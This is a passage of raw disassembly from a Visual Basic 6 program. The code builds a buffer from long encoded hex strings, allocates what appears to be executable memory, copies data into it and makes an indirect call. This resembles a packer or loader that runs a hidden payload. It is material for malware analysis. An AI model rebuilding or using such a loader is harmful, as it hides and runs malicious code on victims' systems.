.text:00409814                 and     dword ptr [ebp-0C8h], 0
.text:0040981B
.text:0040981B loc_40981B:                             ; CODE XREF: .text:00409812↑j
.text:0040981B                 mov     eax, [ebp+8]
.text:0040981E                 push    dword ptr [eax+7Ch]
.text:00409821                 push    dword ptr [ebp-18h]
.text:00409824                 call    __vbaStrCat
.text:00409829                 mov     edx, eax
.text:0040982B                 lea     ecx, [ebp-1Ch]
.text:0040982E                 call    __vbaStrMove
.text:00409833                 mov     edx, eax
.text:00409835                 mov     ecx, [ebp+8]
.text:00409838                 add     ecx, 7Ch ; '|'
.text:0040983B                 call    __vbaStrCopy
.text:00409840                 lea     eax, [ebp-1Ch]
.text:00409843                 push    eax
.text:00409844                 lea     eax, [ebp-18h]
.text:00409847                 push    eax
.text:00409848                 push    2
.text:0040984A                 call    __vbaFreeStrList
.text:0040984F                 add     esp, 0Ch
.text:00409852                 fld     ds:flt_4011C0
.text:00409858                 fstp    dword ptr [ebp-20h]
.text:0040985B                 lea     eax, [ebp-18h]
.text:0040985E                 push    eax
.text:0040985F                 push    0
.text:00409861                 lea     eax, [ebp-20h]
.text:00409864                 push    eax
.text:00409865                 push    offset aQ686e707d6a6b7 ; "q686e707d6a6b796e6c6b696d6b68706a696d7a"...
.text:0040986A                 mov     eax, [ebp+8]
.text:0040986D                 mov     eax, [eax]
.text:0040986F                 push    dword ptr [ebp+8]
.text:00409872                 call    dword ptr [eax+24h]
.text:00409875                 mov     [ebp-2Ch], eax
.text:00409878                 cmp     dword ptr [ebp-2Ch], 0
.text:0040987C                 jge     short loc_409898
.text:0040987E                 push    24h ; '$'
.text:00409880                 push    offset dword_4027CC
.text:00409885                 push    dword ptr [ebp+8]
.text:00409888                 push    dword ptr [ebp-2Ch]
.text:0040988B                 call    __vbaHresultCheckObj
.text:00409890                 mov     [ebp-0CCh], eax
.text:00409896                 jmp     short loc_40989F
.text:00409898 ; ---------------------------------------------------------------------------
.text:00409898
.text:00409898 loc_409898:                             ; CODE XREF: .text:0040987C↑j
.text:00409898                 and     dword ptr [ebp-0CCh], 0
.text:0040989F
.text:0040989F loc_40989F:                             ; CODE XREF: .text:00409896↑j
.text:0040989F                 mov     eax, [ebp+8]
.text:004098A2                 push    dword ptr [eax+7Ch]
.text:004098A5                 push    dword ptr [ebp-18h]
.text:004098A8                 call    __vbaStrCat
.text:004098AD                 mov     edx, eax
.text:004098AF                 lea     ecx, [ebp-1Ch]
.text:004098B2                 call    __vbaStrMove
.text:004098B7                 mov     edx, eax
.text:004098B9                 mov     ecx, [ebp+8]
.text:004098BC                 add     ecx, 7Ch ; '|'
.text:004098BF                 call    __vbaStrCopy
.text:004098C4                 lea     eax, [ebp-1Ch]
.text:004098C7                 push    eax
.text:004098C8                 lea     eax, [ebp-18h]
.text:004098CB                 push    eax
.text:004098CC                 push    2
.text:004098CE                 call    __vbaFreeStrList
.text:004098D3                 add     esp, 0Ch
.text:004098D6                 fld     ds:flt_4011B4
.text:004098DC                 fstp    dword ptr [ebp-20h]
.text:004098DF                 lea     eax, [ebp-18h]
.text:004098E2                 push    eax
.text:004098E3                 push    0
.text:004098E5                 lea     eax, [ebp-20h]
.text:004098E8                 push    eax
.text:004098E9                 push    offset aV5151443b4d433 ; "v5151443b4d433b3b3b3b3b3b3f3e4350503d4c"...
.text:004098EE                 mov     eax, [ebp+8]
.text:004098F1                 mov     eax, [eax]
.text:004098F3                 push    dword ptr [ebp+8]
.text:004098F6                 call    dword ptr [eax+24h]
.text:004098F9                 mov     [ebp-2Ch], eax
.text:004098FC                 cmp     dword ptr [ebp-2Ch], 0
.text:00409900                 jge     short loc_40991C
.text:00409902                 push    24h ; '$'
.text:00409904                 push    offset dword_4027CC
.text:00409909                 push    dword ptr [ebp+8]
.text:0040990C                 push    dword ptr [ebp-2Ch]
.text:0040990F                 call    __vbaHresultCheckObj
.text:00409914                 mov     [ebp-0D0h], eax
.text:0040991A                 jmp     short loc_409923
.text:0040991C ; ---------------------------------------------------------------------------
.text:0040991C
.text:0040991C loc_40991C:                             ; CODE XREF: .text:00409900↑j
.text:0040991C                 and     dword ptr [ebp-0D0h], 0
.text:00409923
.text:00409923 loc_409923:                             ; CODE XREF: .text:0040991A↑j
.text:00409923                 mov     eax, [ebp+8]
.text:00409926                 push    dword ptr [eax+7Ch]
.text:00409929                 push    dword ptr [ebp-18h]
.text:0040992C                 call    __vbaStrCat
.text:00409931                 mov     edx, eax
.text:00409933                 lea     ecx, [ebp-1Ch]
.text:00409936                 call    __vbaStrMove
.text:0040993B                 mov     edx, eax
.text:0040993D                 mov     ecx, [ebp+8]
.text:00409940                 add     ecx, 7Ch ; '|'
.text:00409943                 call    __vbaStrCopy
.text:00409948                 lea     eax, [ebp-1Ch]
.text:0040994B                 push    eax
.text:0040994C                 lea     eax, [ebp-18h]
.text:0040994F                 push    eax
.text:00409950                 push    2
.text:00409952                 call    __vbaFreeStrList
.text:00409957                 add     esp, 0Ch
.text:0040995A                 fld     ds:flt_4011B0
.text:00409960                 fstp    dword ptr [ebp-20h]
.text:00409963                 lea     eax, [ebp-18h]
.text:00409966                 push    eax
.text:00409967                 push    0
.text:00409969                 lea     eax, [ebp-20h]
.text:0040996C                 push    eax
.text:0040996D                 push    offset aR9389849482878 ; "r93898494828782839389818181818181858189"...
.text:00409972                 mov     eax, [ebp+8]
.text:00409975                 mov     eax, [eax]
.text:00409977                 push    dword ptr [ebp+8]
.text:0040997A                 call    dword ptr [eax+24h]
.text:0040997D                 mov     [ebp-2Ch], eax
.text:00409980                 cmp     dword ptr [ebp-2Ch], 0
.text:00409984                 jge     short loc_4099A0
.text:00409986                 push    24h ; '$'
.text:00409988                 push    offset dword_4027CC
.text:0040998D                 push    dword ptr [ebp+8]
.text:00409990                 push    dword ptr [ebp-2Ch]
.text:00409993                 call    __vbaHresultCheckObj
.text:00409998                 mov     [ebp-0D4h], eax
.text:0040999E                 jmp     short loc_4099A7
.text:004099A0 ; ---------------------------------------------------------------------------
.text:004099A0
.text:004099A0 loc_4099A0:                             ; CODE XREF: .text:00409984↑j
.text:004099A0                 and     dword ptr [ebp-0D4h], 0
.text:004099A7
.text:004099A7 loc_4099A7:                             ; CODE XREF: .text:0040999E↑j
.text:004099A7                 mov     eax, [ebp+8]
.text:004099AA                 push    dword ptr [eax+7Ch]
.text:004099AD                 push    dword ptr [ebp-18h]
.text:004099B0                 call    __vbaStrCat
.text:004099B5                 mov     edx, eax
.text:004099B7                 lea     ecx, [ebp-1Ch]
.text:004099BA                 call    __vbaStrMove
.text:004099BF                 mov     edx, eax
.text:004099C1                 mov     ecx, [ebp+8]
.text:004099C4                 add     ecx, 7Ch ; '|'
.text:004099C7                 call    __vbaStrCopy
.text:004099CC                 lea     eax, [ebp-1Ch]
.text:004099CF                 push    eax
.text:004099D0                 lea     eax, [ebp-18h]
.text:004099D3                 push    eax
.text:004099D4                 push    2
.text:004099D6                 call    __vbaFreeStrList
.text:004099DB                 add     esp, 0Ch
.text:004099DE                 fld     ds:flt_401218
.text:004099E4                 fstp    dword ptr [ebp-20h]
.text:004099E7                 lea     eax, [ebp-18h]
.text:004099EA                 push    eax
.text:004099EB                 push    0
.text:004099ED                 lea     eax, [ebp-20h]
.text:004099F0                 push    eax
.text:004099F1                 push    offset aY33323b3a48484 ; "Y33323b3a48484848484848453a473633363436"...
.text:004099F6                 mov     eax, [ebp+8]
.text:004099F9                 mov     eax, [eax]
.text:004099FB                 push    dword ptr [ebp+8]
.text:004099FE                 call    dword ptr [eax+24h]
.text:00409A01                 mov     [ebp-2Ch], eax
.text:00409A04                 cmp     dword ptr [ebp-2Ch], 0
.text:00409A08                 jge     short loc_409A24
.text:00409A0A                 push    24h ; '$'
.text:00409A0C                 push    offset dword_4027CC
.text:00409A11                 push    dword ptr [ebp+8]
.text:00409A14                 push    dword ptr [ebp-2Ch]
.text:00409A17                 call    __vbaHresultCheckObj
.text:00409A1C                 mov     [ebp-0D8h], eax
.text:00409A22                 jmp     short loc_409A2B
.text:00409A24 ; ---------------------------------------------------------------------------
.text:00409A24
.text:00409A24 loc_409A24:                             ; CODE XREF: .text:00409A08↑j
.text:00409A24                 and     dword ptr [ebp-0D8h], 0
.text:00409A2B
.text:00409A2B loc_409A2B:                             ; CODE XREF: .text:00409A22↑j
.text:00409A2B                 mov     eax, [ebp+8]
.text:00409A2E                 push    dword ptr [eax+7Ch]
.text:00409A31                 push    dword ptr [ebp-18h]
.text:00409A34                 call    __vbaStrCat
.text:00409A39                 mov     edx, eax
.text:00409A3B                 lea     ecx, [ebp-1Ch]
.text:00409A3E                 call    __vbaStrMove
.text:00409A43                 mov     edx, eax
.text:00409A45                 mov     ecx, [ebp+8]
.text:00409A48                 add     ecx, 7Ch ; '|'
.text:00409A4B                 call    __vbaStrCopy
.text:00409A50                 lea     eax, [ebp-1Ch]
.text:00409A53                 push    eax
.text:00409A54                 lea     eax, [ebp-18h]
.text:00409A57                 push    eax
.text:00409A58                 push    2
.text:00409A5A                 call    __vbaFreeStrList
.text:00409A5F                 add     esp, 0Ch
.text:00409A62                 fld     ds:flt_4011AC
.text:00409A68                 fstp    dword ptr [ebp-20h]
.text:00409A6B                 lea     eax, [ebp-18h]
.text:00409A6E                 push    eax
.text:00409A6F                 push    0
.text:00409A71                 lea     eax, [ebp-20h]
.text:00409A74                 push    eax
.text:00409A75                 push    offset aL58585c5a5b5a5 ; "L58585c5a5b5a585a565a575a5a5a58685d5559"...
.text:00409A7A                 mov     eax, [ebp+8]
.text:00409A7D                 mov     eax, [eax]
.text:00409A7F                 push    dword ptr [ebp+8]
.text:00409A82                 call    dword ptr [eax+24h]
.text:00409A85                 mov     [ebp-2Ch], eax
.text:00409A88                 cmp     dword ptr [ebp-2Ch], 0
.text:00409A8C                 jge     short loc_409AA8
.text:00409A8E                 push    24h ; '$'
.text:00409A90                 push    offset dword_4027CC
.text:00409A95                 push    dword ptr [ebp+8]
.text:00409A98                 push    dword ptr [ebp-2Ch]
.text:00409A9B                 call    __vbaHresultCheckObj
.text:00409AA0                 mov     [ebp-0DCh], eax
.text:00409AA6                 jmp     short loc_409AAF
.text:00409AA8 ; ---------------------------------------------------------------------------
.text:00409AA8
.text:00409AA8 loc_409AA8:                             ; CODE XREF: .text:00409A8C↑j
.text:00409AA8                 and     dword ptr [ebp-0DCh], 0
.text:00409AAF
.text:00409AAF loc_409AAF:                             ; CODE XREF: .text:00409AA6↑j
.text:00409AAF                 mov     eax, [ebp+8]
.text:00409AB2                 push    dword ptr [eax+7Ch]
.text:00409AB5                 push    dword ptr [ebp-18h]
.text:00409AB8                 call    __vbaStrCat
.text:00409ABD                 mov     edx, eax
.text:00409ABF                 lea     ecx, [ebp-1Ch]
.text:00409AC2                 call    __vbaStrMove
.text:00409AC7                 mov     edx, eax
.text:00409AC9                 mov     ecx, [ebp+8]
.text:00409ACC                 add     ecx, 7Ch ; '|'
.text:00409ACF                 call    __vbaStrCopy
.text:00409AD4                 lea     eax, [ebp-1Ch]
.text:00409AD7                 push    eax
.text:00409AD8                 lea     eax, [ebp-18h]
.text:00409ADB                 push    eax
.text:00409ADC                 push    2
.text:00409ADE                 call    __vbaFreeStrList
.text:00409AE3                 add     esp, 0Ch
.text:00409AE6                 fld     ds:flt_401214
.text:00409AEC                 fstp    dword ptr [ebp-20h]
.text:00409AEF                 lea     eax, [ebp-18h]
.text:00409AF2                 push    eax
.text:00409AF3                 push    0
.text:00409AF5                 lea     eax, [ebp-20h]
.text:00409AF8                 push    eax
.text:00409AF9                 push    offset aH9796949692969 ; "H9796949692969396969694a4a596a2969a96a3"...
.text:00409AFE                 mov     eax, [ebp+8]
.text:00409B01                 mov     eax, [eax]
.text:00409B03                 push    dword ptr [ebp+8]
.text:00409B06                 call    dword ptr [eax+24h]
.text:00409B09                 mov     [ebp-2Ch], eax
.text:00409B0C                 cmp     dword ptr [ebp-2Ch], 0
.text:00409B10                 jge     short loc_409B2C
.text:00409B12                 push    24h ; '$'
.text:00409B14                 push    offset dword_4027CC
.text:00409B19                 push    dword ptr [ebp+8]
.text:00409B1C                 push    dword ptr [ebp-2Ch]
.text:00409B1F                 call    __vbaHresultCheckObj
.text:00409B24                 mov     [ebp-0E0h], eax
.text:00409B2A                 jmp     short loc_409B33
.text:00409B2C ; ---------------------------------------------------------------------------
.text:00409B2C
.text:00409B2C loc_409B2C:                             ; CODE XREF: .text:00409B10↑j
.text:00409B2C                 and     dword ptr [ebp-0E0h], 0
.text:00409B33
.text:00409B33 loc_409B33:                             ; CODE XREF: .text:00409B2A↑j
.text:00409B33                 mov     eax, [ebp+8]
.text:00409B36                 push    dword ptr [eax+7Ch]
.text:00409B39                 push    dword ptr [ebp-18h]
.text:00409B3C                 call    __vbaStrCat
.text:00409B41                 mov     edx, eax
.text:00409B43                 lea     ecx, [ebp-1Ch]
.text:00409B46                 call    __vbaStrMove
.text:00409B4B                 mov     edx, eax
.text:00409B4D                 mov     ecx, [ebp+8]
.text:00409B50                 add     ecx, 7Ch ; '|'
.text:00409B53                 call    __vbaStrCopy
.text:00409B58                 lea     eax, [ebp-1Ch]
.text:00409B5B                 push    eax
.text:00409B5C                 lea     eax, [ebp-18h]
.text:00409B5F                 push    eax
.text:00409B60                 push    2
.text:00409B62                 call    __vbaFreeStrList
.text:00409B67                 add     esp, 0Ch
.text:00409B6A                 fld     ds:flt_4011A8
.text:00409B70                 fstp    dword ptr [ebp-20h]
.text:00409B73                 lea     eax, [ebp-18h]
.text:00409B76                 push    eax
.text:00409B77                 push    0
.text:00409B79                 lea     eax, [ebp-20h]
.text:00409B7C                 push    eax
.text:00409B7D                 push    offset aZ8a8d808e7b788 ; "z8a8d808e7b788c788e8b798b7f787c7f788b7c"...
.text:00409B82                 mov     eax, [ebp+8]
.text:00409B85                 mov     eax, [eax]
.text:00409B87                 push    dword ptr [ebp+8]
.text:00409B8A                 call    dword ptr [eax+24h]
.text:00409B8D                 mov     [ebp-2Ch], eax
.text:00409B90                 cmp     dword ptr [ebp-2Ch], 0
.text:00409B94                 jge     short loc_409BB0
.text:00409B96                 push    24h ; '$'
.text:00409B98                 push    offset dword_4027CC
.text:00409B9D                 push    dword ptr [ebp+8]
.text:00409BA0                 push    dword ptr [ebp-2Ch]
.text:00409BA3                 call    __vbaHresultCheckObj
.text:00409BA8                 mov     [ebp-0E4h], eax
.text:00409BAE                 jmp     short loc_409BB7
.text:00409BB0 ; ---------------------------------------------------------------------------
.text:00409BB0
.text:00409BB0 loc_409BB0:                             ; CODE XREF: .text:00409B94↑j
.text:00409BB0                 and     dword ptr [ebp-0E4h], 0
.text:00409BB7
.text:00409BB7 loc_409BB7:                             ; CODE XREF: .text:00409BAE↑j
.text:00409BB7                 mov     eax, [ebp+8]
.text:00409BBA                 push    dword ptr [eax+7Ch]
.text:00409BBD                 push    dword ptr [ebp-18h]
.text:00409BC0                 call    __vbaStrCat
.text:00409BC5                 mov     edx, eax
.text:00409BC7                 lea     ecx, [ebp-1Ch]
.text:00409BCA                 call    __vbaStrMove
.text:00409BCF                 mov     edx, eax
.text:00409BD1                 mov     ecx, [ebp+8]
.text:00409BD4                 add     ecx, 7Ch ; '|'
.text:00409BD7                 call    __vbaStrCopy
.text:00409BDC                 lea     eax, [ebp-1Ch]
.text:00409BDF                 push    eax
.text:00409BE0                 lea     eax, [ebp-18h]
.text:00409BE3                 push    eax
.text:00409BE4                 push    2
.text:00409BE6                 call    __vbaFreeStrList
.text:00409BEB                 add     esp, 0Ch
.text:00409BEE                 fld     ds:flt_4011E0
.text:00409BF4                 fstp    dword ptr [ebp-20h]
.text:00409BF7                 lea     eax, [ebp-18h]
.text:00409BFA                 push    eax
.text:00409BFB                 push    0
.text:00409BFD                 lea     eax, [ebp-20h]
.text:00409C00                 push    eax
.text:00409C01                 push    offset aM4949494949494 ; "M49494949494949494c5c4c5c5d4e5a4e524e5b"...
.text:00409C06                 mov     eax, [ebp+8]
.text:00409C09                 mov     eax, [eax]
.text:00409C0B                 push    dword ptr [ebp+8]
.text:00409C0E                 call    dword ptr [eax+24h]
.text:00409C11                 mov     [ebp-2Ch], eax
.text:00409C14                 cmp     dword ptr [ebp-2Ch], 0
.text:00409C18                 jge     short loc_409C34
.text:00409C1A                 push    24h ; '$'
.text:00409C1C                 push    offset dword_4027CC
.text:00409C21                 push    dword ptr [ebp+8]
.text:00409C24                 push    dword ptr [ebp-2Ch]
.text:00409C27                 call    __vbaHresultCheckObj
.text:00409C2C                 mov     [ebp-0E8h], eax
.text:00409C32                 jmp     short loc_409C3B
.text:00409C34 ; ---------------------------------------------------------------------------
.text:00409C34
.text:00409C34 loc_409C34:                             ; CODE XREF: .text:00409C18↑j
.text:00409C34                 and     dword ptr [ebp-0E8h], 0
.text:00409C3B
.text:00409C3B loc_409C3B:                             ; CODE XREF: .text:00409C32↑j
.text:00409C3B                 mov     eax, [ebp+8]
.text:00409C3E                 push    dword ptr [eax+7Ch]
.text:00409C41                 push    dword ptr [ebp-18h]
.text:00409C44                 call    __vbaStrCat
.text:00409C49                 mov     edx, eax
.text:00409C4B                 lea     ecx, [ebp-1Ch]
.text:00409C4E                 call    __vbaStrMove
.text:00409C53                 mov     edx, eax
.text:00409C55                 mov     ecx, [ebp+8]
.text:00409C58                 add     ecx, 7Ch ; '|'
.text:00409C5B                 call    __vbaStrCopy
.text:00409C60                 lea     eax, [ebp-1Ch]
.text:00409C63                 push    eax
.text:00409C64                 lea     eax, [ebp-18h]
.text:00409C67                 push    eax
.text:00409C68                 push    2
.text:00409C6A                 call    __vbaFreeStrList
.text:00409C6F                 add     esp, 0Ch
.text:00409C72                 wait
.text:00409C73                 push    offset loc_409C8E
.text:00409C78                 jmp     short loc_409C8D
.text:00409C7A ; ---------------------------------------------------------------------------
.text:00409C7A
.text:00409C7A loc_409C7A:                             ; DATA XREF: .text:00401234↑o
.text:00409C7A                 lea     eax, [ebp-1Ch]
.text:00409C7D                 push    eax
.text:00409C7E                 lea     eax, [ebp-18h]
.text:00409C81                 push    eax
.text:00409C82                 push    2
.text:00409C84                 call    __vbaFreeStrList
.text:00409C89                 add     esp, 0Ch
.text:00409C8C                 retn
.text:00409C8D ; ---------------------------------------------------------------------------
.text:00409C8D
.text:00409C8D loc_409C8D:                             ; CODE XREF: .text:00409C78↑j
.text:00409C8D                 retn
.text:00409C8E ; ---------------------------------------------------------------------------
.text:00409C8E
.text:00409C8E loc_409C8E:                             ; CODE XREF: .text:loc_409C8D↑j
.text:00409C8E                                         ; DATA XREF: .text:00409C73↑o
.text:00409C8E                 mov     eax, [ebp+8]
.text:00409C91                 mov     eax, [eax]
.text:00409C93                 push    dword ptr [ebp+8]
.text:00409C96                 call    dword ptr [eax+8]
.text:00409C99                 mov     eax, [ebp-4]
.text:00409C9C                 mov     ecx, [ebp-14h]
.text:00409C9F                 mov     large fs:0, ecx
.text:00409CA6                 pop     edi
.text:00409CA7                 pop     esi
.text:00409CA8                 pop     ebx
.text:00409CA9                 leave
.text:00409CAA                 retn    4
.text:00409CAD ; ---------------------------------------------------------------------------
.text:00409CAD
.text:00409CAD loc_409CAD:                             ; CODE XREF: .text:00401AD5↑j
.text:00409CAD                 push    ebp
.text:00409CAE                 mov     ebp, esp
.text:00409CB0                 sub     esp, 0Ch
.text:00409CB3                 push    offset __vbaExceptHandler
.text:00409CB8                 mov     eax, large fs:0
.text:00409CBE                 push    eax
.text:00409CBF                 mov     large fs:0, esp
.text:00409CC6                 push    30h ; '0'
.text:00409CC8                 pop     eax
.text:00409CC9                 call    __vbaChkstk
.text:00409CCE                 push    ebx
.text:00409CCF                 push    esi
.text:00409CD0                 push    edi
.text:00409CD1                 mov     [ebp-0Ch], esp
.text:00409CD4                 mov     dword ptr [ebp-8], offset dword_401238
.text:00409CDB                 mov     dword ptr [ebp-4], 0
.text:00409CE2                 mov     eax, [ebp+8]
.text:00409CE5                 mov     eax, [eax]
.text:00409CE7                 push    dword ptr [ebp+8]
.text:00409CEA                 call    dword ptr [eax+4]
.text:00409CED                 lea     edx, [ebp+0Ch]
.text:00409CF0                 lea     ecx, [ebp-24h]
.text:00409CF3                 call    __vbaVarDup
.text:00409CF8                 call    sub_402A6C
.text:00409CFD                 call    __vbaSetSystemError
.text:00409D02                 push    10h
.text:00409D04                 push    10h
.text:00409D06                 push    40000h
.text:00409D0B                 call    sub_402AB0
.text:00409D10                 mov     [ebp-3Ch], eax
.text:00409D13                 call    __vbaSetSystemError
.text:00409D18                 mov     eax, [ebp-3Ch]
.text:00409D1B                 mov     [ebp-38h], eax
.text:00409D1E                 push    0
.text:00409D20                 push    10h
.text:00409D22                 lea     eax, [ebp-24h]
.text:00409D25                 push    eax
.text:00409D26                 push    dword ptr [ebp-38h]
.text:00409D29                 push    0FFFFFFFFh
.text:00409D2B                 call    sub_4029F8
.text:00409D30                 call    __vbaSetSystemError
.text:00409D35                 mov     eax, [ebp-38h]
.text:00409D38                 add     eax, 8
.text:00409D3B                 jo      loc_409DD0
.text:00409D41                 mov     [ebp-3Ch], eax
.text:00409D44                 push    0
.text:00409D46                 push    4
.text:00409D48                 lea     eax, [ebp-3Ch]
.text:00409D4B                 push    eax
.text:00409D4C                 lea     eax, [ebp-34h]
.text:00409D4F                 push    eax
.text:00409D50                 push    0FFFFFFFFh
.text:00409D52                 call    sub_4029F8
.text:00409D57                 call    __vbaSetSystemError
.text:00409D5C                 push    0
.text:00409D5E                 push    4
.text:00409D60                 push    dword ptr [ebp-34h]
.text:00409D63                 lea     eax, [ebp-30h]
.text:00409D66                 push    eax
.text:00409D67                 push    0FFFFFFFFh
.text:00409D69                 call    sub_4029F8
.text:00409D6E                 call    __vbaSetSystemError
.text:00409D73                 push    0
.text:00409D75                 push    4
.text:00409D77                 mov     eax, [ebp-30h]
.text:00409D7A                 add     eax, 10h
.text:00409D7D                 jo      short loc_409DD0
.text:00409D7F                 push    eax
.text:00409D80                 lea     eax, [ebp-2Ch]
.text:00409D83                 push    eax
.text:00409D84                 push    0FFFFFFFFh
.text:00409D86                 call    sub_4029F8
.text:00409D8B                 call    __vbaSetSystemError
.text:00409D90                 mov     eax, [ebp-2Ch]
.text:00409D93                 sub     eax, 1
.text:00409D96                 jo      short loc_409DD0
.text:00409D98                 mov     [ebp-28h], eax
.text:00409D9B                 push    offset sub_409DA9
.text:00409DA0                 lea     ecx, [ebp-24h]
.text:00409DA3                 call    __vbaFreeVar
.text:00409DA8                 retn
.text:00409DA9
.text:00409DA9 ; =============== S U B R O U T I N E =======================================
.text:00409DA9
.text:00409DA9
.text:00409DA9 sub_409DA9      proc near               ; DATA XREF: .text:00409D9B↑o
.text:00409DA9                 mov     eax, [ebp+8]
.text:00409DAC                 mov     eax, [eax]
.text:00409DAE                 push    dword ptr [ebp+8]
.text:00409DB1                 call    dword ptr [eax+8]
.text:00409DB4                 mov     eax, [ebp+1Ch]
.text:00409DB7                 mov     ecx, [ebp-28h]
.text:00409DBA                 mov     [eax], ecx
.text:00409DBC                 mov     eax, [ebp-4]
.text:00409DBF                 mov     ecx, [ebp-14h]
.text:00409DC2                 mov     large fs:0, ecx
.text:00409DC9                 pop     edi
.text:00409DCA                 pop     esi
.text:00409DCB                 pop     ebx
.text:00409DCC                 leave
.text:00409DCD                 retn    18h
.text:00409DCD sub_409DA9      endp ; sp-analysis failed
.text:00409DCD
.text:00409DD0 ; ---------------------------------------------------------------------------
.text:00409DD0
.text:00409DD0 loc_409DD0:                             ; CODE XREF: .text:00409D3B↑j
.text:00409DD0                                         ; .text:00409D7D↑j ...
.text:00409DD0                 call    __vbaErrorOverflow
.text:00409DD5 ; ---------------------------------------------------------------------------
.text:00409DD5
.text:00409DD5 loc_409DD5:                             ; CODE XREF: .text:00401AE2↑j
.text:00409DD5                 push    ebp
.text:00409DD6                 mov     ebp, esp
.text:00409DD8                 sub     esp, 0Ch
.text:00409DDB                 push    offset __vbaExceptHandler
.text:00409DE0                 mov     eax, large fs:0
.text:00409DE6                 push    eax
.text:00409DE7                 mov     large fs:0, esp
.text:00409DEE                 push    1Ch
.text:00409DF0                 pop     eax
.text:00409DF1                 call    __vbaChkstk
.text:00409DF6                 push    ebx
.text:00409DF7                 push    esi
.text:00409DF8                 push    edi
.text:00409DF9                 mov     [ebp-0Ch], esp
.text:00409DFC                 mov     dword ptr [ebp-8], offset dword_401248
.text:00409E03                 mov     dword ptr [ebp-4], 0
.text:00409E0A                 mov     eax, [ebp+8]
.text:00409E0D                 mov     eax, [eax]
.text:00409E0F                 push    dword ptr [ebp+8]
.text:00409E12                 call    dword ptr [eax+4]
.text:00409E15                 mov     eax, [ebp+10h]
.text:00409E18                 and     dword ptr [eax], 0
.text:00409E1B                 movsx   eax, word ptr [ebp+0Ch]
.text:00409E1F                 push    eax
.text:00409E20                 lea     eax, [ebp-28h]
.text:00409E23                 push    eax
.text:00409E24                 call    rtcVarBstrFromAnsi
.text:00409E29                 lea     eax, [ebp-28h]
.text:00409E2C                 push    eax
.text:00409E2D                 call    __vbaStrVarMove
.text:00409E32                 mov     edx, eax
.text:00409E34                 lea     ecx, [ebp-18h]
.text:00409E37                 call    __vbaStrMove
.text:00409E3C                 lea     ecx, [ebp-28h]
.text:00409E3F                 call    __vbaFreeVar
.text:00409E44                 push    offset loc_409E67
.text:00409E49                 jmp     short loc_409E66
.text:00409E4B ; ---------------------------------------------------------------------------
.text:00409E4B
.text:00409E4B loc_409E4B:                             ; DATA XREF: .text:00401254↑o
.text:00409E4B                 mov     eax, [ebp-4]
.text:00409E4E                 and     eax, 4
.text:00409E51                 test    eax, eax
.text:00409E53                 jz      short loc_409E5D
.text:00409E55                 lea     ecx, [ebp-18h]
.text:00409E58                 call    __vbaFreeStr
.text:00409E5D
.text:00409E5D loc_409E5D:                             ; CODE XREF: .text:00409E53↑j
.text:00409E5D                 lea     ecx, [ebp-28h]
.text:00409E60                 call    __vbaFreeVar
.text:00409E65                 retn
.text:00409E66 ; ---------------------------------------------------------------------------
.text:00409E66
.text:00409E66 loc_409E66:                             ; CODE XREF: .text:00409E49↑j
.text:00409E66                 retn
.text:00409E67 ; ---------------------------------------------------------------------------
.text:00409E67
.text:00409E67 loc_409E67:                             ; CODE XREF: .text:loc_409E66↑j
.text:00409E67                                         ; DATA XREF: .text:00409E44↑o
.text:00409E67                 mov     eax, [ebp+8]
.text:00409E6A                 mov     eax, [eax]
.text:00409E6C                 push    dword ptr [ebp+8]
.text:00409E6F                 call    dword ptr [eax+8]
.text:00409E72                 mov     eax, [ebp+10h]
.text:00409E75                 mov     ecx, [ebp-18h]
.text:00409E78                 mov     [eax], ecx
.text:00409E7A                 mov     eax, [ebp-4]
.text:00409E7D                 mov     ecx, [ebp-14h]
.text:00409E80                 mov     large fs:0, ecx
.text:00409E87                 pop     edi
.text:00409E88                 pop     esi
.text:00409E89                 pop     ebx
.text:00409E8A                 leave
.text:00409E8B                 retn    0Ch
.text:00409E8E ; ---------------------------------------------------------------------------
.text:00409E8E
.text:00409E8E loc_409E8E:                             ; CODE XREF: .text:00401AEF↑j
.text:00409E8E                 push    ebp
.text:00409E8F                 mov     ebp, esp
.text:00409E91                 sub     esp, 0Ch
.text:00409E94                 push    offset __vbaExceptHandler
.text:00409E99                 mov     eax, large fs:0
.text:00409E9F                 push    eax
.text:00409EA0                 mov     large fs:0, esp
.text:00409EA7                 push    28h ; '('
.text:00409EA9                 pop     eax
.text:00409EAA                 call    __vbaChkstk
.text:00409EAF                 push    ebx
.text:00409EB0                 push    esi
.text:00409EB1                 push    edi
.text:00409EB2                 mov     [ebp-0Ch], esp
.text:00409EB5                 mov     dword ptr [ebp-8], offset dword_401258
.text:00409EBC                 mov     dword ptr [ebp-4], 0
.text:00409EC3                 mov     eax, [ebp+8]
.text:00409EC6                 mov     eax, [eax]
.text:00409EC8                 push    dword ptr [ebp+8]
.text:00409ECB                 call    dword ptr [eax+4]
.text:00409ECE                 mov     edx, [ebp+10h]
.text:00409ED1                 lea     ecx, [ebp-18h]
.text:00409ED4                 call    __vbaStrCopy
.text:00409ED9                 lea     eax, [ebp-18h]
.text:00409EDC                 push    eax
.text:00409EDD                 call    sub_40A464
.text:00409EE2                 mov     [ebp-2Ch], eax
.text:00409EE5                 mov     eax, [ebp+0Ch]
.text:00409EE8                 push    dword ptr [eax]
.text:00409EEA                 lea     eax, [ebp-1Ch]
.text:00409EED                 push    eax
.text:00409EEE                 call    __vbaAryLock
.text:00409EF3                 push    1
.text:00409EF5                 push    1
.text:00409EF7                 mov     eax, [ebp-1Ch]
.text:00409EFA                 xor     ecx, ecx
.text:00409EFC                 sub     ecx, [eax+14h]
.text:00409EFF                 mov     eax, [ebp-1Ch]
.text:00409F02                 mov     eax, [eax+0Ch]
.text:00409F05                 add     eax, ecx
.text:00409F07                 push    eax
.text:00409F08                 call    sub_40A4A1
.text:00409F0D                 mov     [ebp-20h], eax
.text:00409F10                 lea     eax, [ebp-1Ch]
.text:00409F13                 push    eax
.text:00409F14                 call    __vbaAryUnlock
.text:00409F19                 and     dword ptr [ebp-24h], 0
.text:00409F1D                 lea     eax, [ebp-28h]
.text:00409F20                 push    eax
.text:00409F21                 lea     eax, [ebp-24h]
.text:00409F24                 push    eax
.text:00409F25                 push    0
.text:00409F27                 push    dword ptr [ebp-20h]
.text:00409F2A                 push    dword ptr [ebp-2Ch]
.text:00409F2D                 mov     eax, [ebp+8]
.text:00409F30                 push    dword ptr [eax+7Ch]
.text:00409F33                 mov     eax, [ebp+8]
.text:00409F36                 mov     eax, [eax]
.text:00409F38                 push    dword ptr [ebp+8]
.text:00409F3B                 call    dword ptr [eax+1Ch]
.text:00409F3E                 mov     [ebp-30h], eax
.text:00409F41                 cmp     dword ptr [ebp-30h], 0
.text:00409F45                 jge     short loc_409F5E
